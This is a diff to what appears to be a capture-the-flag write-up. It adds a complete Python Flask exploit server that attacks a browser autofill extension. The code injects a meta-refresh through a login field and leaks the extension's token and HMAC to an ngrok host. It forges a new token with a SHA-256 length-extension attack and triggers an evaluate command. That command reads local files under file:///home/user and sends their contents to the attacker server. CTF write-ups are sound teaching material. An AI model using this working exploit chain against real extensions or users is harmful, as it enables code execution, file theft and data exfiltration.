@@ -712,11 +712,149 @@ The author also mentioned about the abuse of [this api](https://developer.mozill
 
 #### Put all the parts together
 
-Here is the exploit that I chained all the parts together.
+Here is the exploit that I chained all the parts together. (This exploit is shamelessly based on the solution provided by @Starlight and @Popax21)
 
+```
+import urllib.parse as urlparse 
+from flask import Flask, request, redirect
+import logging
+import hlextend
+from urllib.parse import quote, urlparse
 
+REMOTE_URL = "https://aef435edffa7.ngrok.app"
 
+app = Flask(__name__)
 
+EVAL_CODE = f"""
+(async () => {{
+    const tab = await new Promise(r => chrome.tabs.create({{
+        url: "file:///home/user"
+    }}, t => r(t)));
+    let run = false;
+
+    chrome.tabs.onUpdated.addListener((id, changeInfo) => {{
+        if (!run) run = changeInfo.url?.endsWith('flag2.txt');
+        console.log(run, changeInfo);
+        if (id == tab.id && changeInfo.status == "complete" && !run) {{
+            console.log("executing");
+            chrome.tabs.executeScript(tab.id, {{ code: "a=Array.from(document.getElementsByTagName('a'));(a.filter(e=>e.textContent.includes('flag-')+e.textContent.includes('flag2')).concat(a.filter(e => e.textContent.length == 11)))[0].click();" }});
+        }}
+        if (run && changeInfo.status == "complete") {{
+            run = false;
+            chrome.tabs.executeScript(tab.id, {{ code: "window.location='{REMOTE_URL}/?flag='+encodeURIComponent(document.body.textContent)" }});
+        }}
+    }});
+}})()
+"""
+
+@app.route("/")
+def landing():
+  return f"""
+<html>
+<body>
+<form name="form">
+<input type="text" name="username">
+<input type="password" name="password">
+<input type="submit" name="submit">
+</form>
+
+<script>
+  (async () => {{
+    let form = document.form;
+    let username = document.querySelector('input[name="username"]');
+    let password = document.querySelector('input[name="password"]');
+
+    username.value = "<meta http-equiv='refresh' content='0; url={REMOTE_URL}/leak_ext_url'>";
+    password.value = 'Nothing';
+    
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+    await sleep(2000);
+    username.dispatchEvent(new Event("change"));
+    await sleep(2000);
+    form.dispatchEvent(new Event("submit"));
+    await sleep(2000);
+    document.location = "{REMOTE_URL}/empty";  
+  }})()
+</script>
+</body>
+</html>
+"""
+
+@app.route("/empty")
+def empty():
+  return """
+<html>
+<body>
+<form name="form">
+<input type="text" name="username">
+<input type="password" name="password">
+<input type="submit" name="submit">
+</form>
+</body>
+</html>
+"""
+
+@app.route("/leak_ext_url")
+def leak_extension_url():
+  return f"""
+<html>
+<body>
+<script>
+let extension_url = window.frameElement.src;
+let leaked_url = extension_url.split('?')[0];
+let queryString = extension_url.split('?')[1];
+const decodedQueryString = decodeURIComponent(queryString);
+const params = new URLSearchParams(decodedQueryString);
+const token = params.get('token');
+const hmac = params.get('hmac');
+
+// send back to server
+location.href = "{REMOTE_URL}/forge_token_hmac?url=" + encodeURIComponent(leaked_url) + "&token=" + encodeURIComponent(token) + "&hmac=" + encodeURIComponent(hmac);
+</script>
+"""
+
+@app.route("/forge_token_hmac")
+def forge_token_hmac():
+  url = request.args.get("url")
+  token = request.args.get('token')
+  hmac = request.args.get('hmac')
+
+  logging.debug(f"Exfiltrated iframe src: '{url}'")
+  logging.debug(f" - token = {token}")
+  logging.debug(f" - hmac  = {hmac}")
+
+  [ts, tabID, ext_origin, cmd, arg1, arg2] = token.split("|")
+  logging.debug(f" - ext_origin = {ext_origin}")
+  # new_token = token.replace("|", "ż")
+  poison_start = token.index('|http')
+  append_token = f"|{ext_origin}|evaluate|{EVAL_CODE}|".encode('ascii')
+
+  sha = hlextend.new('sha256')
+  extended = sha.extend(append_token, token.encode('ascii'), 32, hmac)
+  print(extended.hex())
+  new_hmac = sha.hexdigest()
+
+  logging.debug(f" - forged token = {extended}")
+  logging.debug(f" - forged hmac  = {new_hmac}")
+
+  extended_unicode = list(extended)
+  poison_end = len(extended) - len(append_token)
+
+  for i in range(poison_start, poison_end):
+        extended_unicode[i] += 256
+
+  extended = b''.join(map(lambda c: chr(c).encode() if c > 255 else bytes([c]), extended_unicode))
+  print('hash extension:', extended)
+  return f"""
+<html>
+<body>
+<iframe src={ext_origin}/autofill.html?token={quote(extended)}&hmac={quote(hmac)}> </iframe>
+</body>
+</html>
+"""
+
+app.run(host="0.0.0.0", port=1337)
+```
 
 ## Log Action
 
